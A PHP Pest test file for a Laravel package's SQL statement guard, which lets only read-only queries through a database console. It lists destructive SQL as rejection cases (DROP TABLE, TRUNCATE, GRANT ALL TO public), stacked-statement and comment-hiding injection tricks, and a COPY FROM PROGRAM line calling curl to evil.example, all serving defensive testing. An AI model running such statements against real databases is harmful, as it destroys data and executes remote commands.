<?php

declare(strict_types=1);

use Heyosseus\Vacuum\Console\StatementGuard;
use Heyosseus\Vacuum\Exceptions\RejectedStatement;

function guard(): StatementGuard
{
    return app(StatementGuard::class);
}

it('lets a select through', function (): void {
    guard()->check('SELECT * FROM orders');
    guard()->check('  select 1  ');
    guard()->check('WITH recent AS (SELECT 1) SELECT * FROM recent');
    guard()->check('TABLE orders');
    guard()->check('VALUES (1), (2)');
    guard()->check('SHOW shared_buffers');
    guard()->check('EXPLAIN SELECT * FROM orders');
})->throwsNoExceptions();

it('turns away a statement that would write', function (string $sql): void {
    guard()->check($sql);
})->with([
    'INSERT INTO orders (id) VALUES (1)',
    'UPDATE orders SET total = 0',
    'DELETE FROM orders',
    'TRUNCATE orders',
    'DROP TABLE orders',
    'ALTER TABLE orders ADD COLUMN x int',
    'CREATE TABLE x (id int)',
    'GRANT ALL ON orders TO public',
    'COPY orders FROM PROGRAM \'curl evil.example\'',
    'DO $$ BEGIN PERFORM 1; END $$',
])->throws(RejectedStatement::class);

it('is not fooled by a comment in front of the statement', function (): void {
    // The oldest trick there is. The guard reads what PostgreSQL would read.
    guard()->check("-- SELECT 1\nDELETE FROM orders");
})->throws(RejectedStatement::class);

it('is not fooled by a block comment either', function (): void {
    guard()->check('/* SELECT 1 */ DROP TABLE orders');
})->throws(RejectedStatement::class);

it('refuses to run two statements at once', function (): void {
    // Otherwise a harmless-looking SELECT carries a passenger.
    guard()->check('SELECT 1; DROP TABLE orders');
})->throws(RejectedStatement::class, 'one statement');

it('allows a trailing semicolon, which everybody types', function (): void {
    guard()->check('SELECT 1;');
})->throwsNoExceptions();

it('refuses an empty statement', function (): void {
    guard()->check('   ');
})->throws(RejectedStatement::class);

it('will not run EXPLAIN ANALYZE unless the application has allowed it', function (): void {
    // EXPLAIN ANALYZE really runs the query. A read-only transaction still stops
    // it writing, but it does not stop it costing an hour of CPU.
    config()->set('vacuum.console.explain_analyze', false);

    guard()->check('EXPLAIN ANALYZE SELECT count(*) FROM orders');
})->throws(RejectedStatement::class, 'EXPLAIN ANALYZE');

it('runs EXPLAIN ANALYZE once the application has allowed it', function (): void {
    config()->set('vacuum.console.explain_analyze', true);

    guard()->check('EXPLAIN ANALYZE SELECT 1');
})->throwsNoExceptions();
